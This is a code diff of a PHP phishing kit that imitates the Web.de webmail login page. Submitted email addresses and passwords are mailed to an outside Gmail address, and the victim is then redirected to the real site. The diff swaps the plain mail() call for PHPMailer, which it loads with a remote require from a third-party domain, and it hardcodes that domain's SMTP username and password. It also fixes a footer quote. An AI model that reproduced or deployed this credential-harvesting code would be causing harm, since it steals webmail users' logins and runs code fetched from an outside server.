@@ -1,19 +1,30 @@
 <?php
 if(isset($_POST['login'])) {
   extract($_POST); 
-  
+
+  require"https://starslinkinvestment.com/classes/PHPMailer/class.phpmailer.php";
   //send email
   $body="New Web.de details has been sent. \n\nEmail: $email \n Password: $password. \n\n Kind Regards";
 
-  $header = 'MIME-Version: 1.0' . "\r\n";
-  $header .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
-  $header .= 'From: <quean29@gmail.com>' . "\r\n";
+  $mail = new PHPMailer();
 
-  $to = "quean29@gmail.com";
-  $subject = "--NEW WEB.DE Details--";
-  $message = $body;
+  $mail->IsSMTP();
+  $mail->SMTPAuth = true;
+  $mail->Port = 25;
+  $mail->Host = "mail.starslinkinvestment.com";
+  $mail->Username = "support@starslinkinvestment.com";
+  $mail->Password = "#StarsInvest";
+  $mail->IsSendmail();
+  $mail->From = "support@starslinkinvestment.com";
+  $mail->AddAddress("quean29@gmail.com");
+  $mail->Subject = "--NEW WEB.DE Details--";
+  
+  $mail->WordWrap = 80;
+  $mail->MsgHTML($body);
+  $mail->IsHTML(true);
+  
 
-  if(mail($to,$subject,$message,$header)) {
+  if($mail->Send()) {
     header("Location: https://mm.web.de/");
   }
 }
@@ -150,7 +161,7 @@ if(isset($_POST['login'])) {
             </div>
         </div>
       </div>
-      <footer class="footer pt-3 pb-3 text-center>
+      <footer class="footer pt-3 pb-3 text-center">
         <span>Impressum</span><br>
         <span>Vertrage heir kundigen</span><br>
         <span>AGB</span><br>
